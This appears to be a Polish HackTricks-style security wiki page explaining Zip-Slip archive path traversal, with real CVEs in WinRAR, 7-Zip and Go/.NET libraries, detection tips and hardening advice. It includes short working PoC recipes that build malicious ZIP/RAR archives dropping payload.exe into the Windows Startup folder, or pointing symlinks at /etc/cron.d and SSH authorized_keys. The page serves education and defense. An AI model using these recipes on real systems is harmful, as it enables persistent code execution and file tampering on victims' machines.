# Path Traversal podczas rozpakowywania archiwów ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Przegląd

Wiele formatów archiwów (ZIP, RAR, TAR, 7-ZIP itd.) pozwala, aby każdy wpis zawierał własną **ścieżkę wewnętrzną**. Gdy narzędzie do rozpakowywania bezkrytycznie respektuje tę ścieżkę, spreparowana nazwa pliku zawierająca `..` lub **ścieżkę absolutną** (np. `C:\Windows\System32\`) zostanie zapisana poza katalogiem wybranym przez użytkownika.
Ta klasa podatności jest powszechnie znana jako *Zip-Slip* lub **path traversal podczas rozpakowywania archiwów**.

Konsekwencje obejmują nadpisywanie dowolnych plików, a nawet bezpośrednie osiągnięcie **remote code execution (RCE)** poprzez umieszczenie payloadu w lokalizacji **auto-run**, takiej jak folder Windows *Startup*.

## Przyczyna źródłowa

1. Attacker tworzy archiwum, w którym nagłówki jednego lub większej liczby plików zawierają:
* Względne sekwencje traversal (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Ścieżki absolutne (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Lub spreparowane **symlinks**, które rozwiązują się poza katalogiem docelowym (częste w ZIP/TAR na systemach *nix).
2. Victim rozpakowuje archiwum za pomocą podatnego narzędzia, które ufa osadzonej ścieżce (lub podąża za symlinks), zamiast ją sanityzować albo wymuszać rozpakowywanie w obrębie wybranego katalogu.
3. Plik zostaje zapisany w lokalizacji kontrolowanej przez attackera i wykonany/załadowany przy następnym uruchomieniu tej ścieżki przez system lub użytkownika.

### .NET `Path.Combine` + `ZipArchive` traversal

Częstym antywzorcem w .NET jest łączenie zamierzonego miejsca docelowego z kontrolowanym przez użytkownika `ZipArchiveEntry.FullName` i rozpakowywanie bez normalizacji ścieżki:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Jeśli `entry.FullName` zaczyna się od `..\\`, następuje traversal; jeśli jest **ścieżką absolutną**, komponent po lewej stronie zostaje całkowicie odrzucony, co prowadzi do **arbitrary file write** jako identyfikatora ekstrakcji.
- Archiwum proof-of-concept zapisujące do sąsiedniego katalogu `app`, monitorowanego przez skaner uruchamiany zgodnie z harmonogramem:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Upuszczenie tego pliku ZIP w monitorowanej skrzynce wejściowej powoduje utworzenie `C:\samples\app\0xdf.txt`, co potwierdza traversal poza `C:\samples\queue\` i umożliwia wykorzystanie kolejnych mechanizmów (np. DLL hijacks).

## Przykład z rzeczywistego świata – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR dla Windows (w tym CLI `rar` / `unrar`, biblioteka DLL oraz przenośny kod źródłowy) nie sprawdzał poprawnie nazw plików podczas rozpakowywania.
Złośliwe archiwum RAR zawierające wpis taki jak:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
wylądowałby **poza** wybranym katalogiem wyjściowym i wewnątrz folderu *Startup* użytkownika. Po zalogowaniu Windows automatycznie wykonuje wszystko, co się tam znajduje, zapewniając *persistent* RCE.<sup>[[5]](#references)</sup>

### Tworzenie archiwum PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Użyte opcje:
* `-ep`  – przechowuj ścieżki plików dokładnie tak, jak zostały podane ( **nie** usuwaj początkowego `./`).

Dostarcz `evil.rar` ofierze i poinstruuj ją, aby rozpakowała go przy użyciu podatnej wersji WinRAR.

### Zaobserwowane wykorzystanie w środowisku naturalnym

ESET poinformował o kampaniach spear-phishingowych grupy RomCom (Storm-0978/UNC2596), w ramach których załączano archiwa RAR wykorzystujące CVE-2025-8088 do wdrażania niestandardowych backdoorów i ułatwiania operacji ransomware.<sup>[[5]](#references)</sup>

## Nowsze przypadki (2024–2025)

### Traversal symlinków ZIP w 7-Zip → RCE (CVE-2025-11001 / ZDI-25-949)
* **Błąd**: Wpisy ZIP będące **symbolic links** były dereferencjonowane podczas rozpakowywania, co pozwalało atakującym opuścić katalog docelowy i nadpisać dowolne ścieżki. Interakcja użytkownika ogranicza się do *otwarcia/rozpakowania* archiwum.<sup>[[1]](#references)</sup>
* **Podatne wersje**: 7-Zip 21.02–24.09 (buildy Windows i Linux). Naprawiono w wersji **25.00** (lipiec 2025) oraz nowszych.
* **Ścieżka wpływu**: Nadpisanie lokalizacji `Start Menu/Programs/Startup` lub lokalizacji uruchamiania usług → kod zostaje wykonany przy następnym logowaniu lub ponownym uruchomieniu usługi.
* **Szybki PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
W załatanej wersji `/etc/cron.d` nie zostanie zmodyfikowany; symlink zostanie rozpakowany jako link wewnątrz `/tmp/target`.

### Zip-Slip w Go mholt/archiver Unarchive() (CVE-2025-3445)
* **Błąd**: `archiver.Unarchive()` podąża za wpisami `../` i wpisami ZIP będącymi symlinkami, zapisując dane poza `outputDir`.<sup>[[2]](#references)</sup>
* **Podatne wersje**: `github.com/mholt/archiver` ≤ 3.5.1 (projekt jest obecnie deprecated).
* **Naprawa**: Przejdź na `mholt/archives` ≥ 0.1.0 lub zaimplementuj sprawdzanie ścieżki kanonicznej przed zapisem.
* **Minimalna reprodukcja**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Wskazówki dotyczące wykrywania

* **Inspekcja statyczna** – Wyświetl wpisy archiwum i oznacz każdą nazwę zawierającą `../`, `..\\`, *ścieżki absolutne* (`/`, `C:`) lub wpisy typu *symlink*, których cel znajduje się poza katalogiem rozpakowywania.
* **Kanonikalizacja** – Upewnij się, że `realpath(join(dest, name))` nadal zaczyna się od `dest`. W przeciwnym razie odrzuć wpis.<sup>[[3]](#references)</sup>
* **Rozpakowywanie w sandboxie** – Dekompresuj do tymczasowego katalogu przy użyciu *bezpiecznego* extractora (np. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i sprawdź, czy wynikowe ścieżki pozostają wewnątrz tego katalogu.
* **Monitorowanie endpointów** – Generuj alerty dotyczące nowych plików wykonywalnych zapisywanych w lokalizacjach `Startup`/`Run`/`cron` krótko po otwarciu archiwum przez WinRAR/7-Zip itp.

## Ograniczanie ryzyka i hardening

1. **Zaktualizuj extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementują sanityzację ścieżek/symlinków. Oba narzędzia nadal nie mają funkcji auto-update.
2. Jeśli to możliwe, rozpakowuj archiwa z opcją „**Do not extract paths**” / “**Ignore paths**”.
3. W systemach Unix obniż uprawnienia i zamontuj **chroot/namespace** przed rozpakowaniem; w Windows użyj **AppContainer** lub sandboxa.
4. Jeśli tworzysz własny kod, normalizuj ścieżki za pomocą `realpath()`/`PathCanonicalize()` **przed** utworzeniem/zapisem i odrzucaj każdy wpis, który wychodzi poza katalog docelowy.

## Dodatkowe / historyczne przypadki

* 2018 – Obszerne zalecenie dotyczące *Zip-Slip* opublikowane przez Snyk, dotyczące wielu bibliotek Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011, podobny traversal podczas scalania `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377), traversal podczas rozpakowywania TAR w slugach (patch w wersji v1.2).
* Każda niestandardowa logika rozpakowywania, która nie wywołuje `PathCanonicalize` / `realpath` przed zapisem.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
